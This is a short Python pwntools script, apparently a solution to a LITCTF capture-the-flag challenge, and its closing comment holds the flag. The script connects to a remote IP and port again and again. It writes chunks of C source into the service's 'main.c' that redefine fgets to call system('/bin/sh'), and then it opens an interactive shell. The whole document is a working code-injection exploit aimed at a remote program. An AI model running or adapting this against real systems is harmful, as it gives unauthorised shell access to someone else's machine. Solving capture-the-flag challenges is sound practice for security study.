from pwn import *

payload = 'char *fgets(char *s, int size, FILE *stream){system("/bin/sh");return NULL;}'

for i in range(0, len(payload), 20):
    r = remote("34.31.154.223", 55959)
    r.sendline(b"main.c")
    r.sendline(b"W")
    print(payload[i:i+20])
    r.sendline(payload[i:i+20])

r.interactive()
#LITCTF{4_pr0gr4m_7h4t_m0d1f13s_1t5elf?_b34u71ful!_a1cd446b}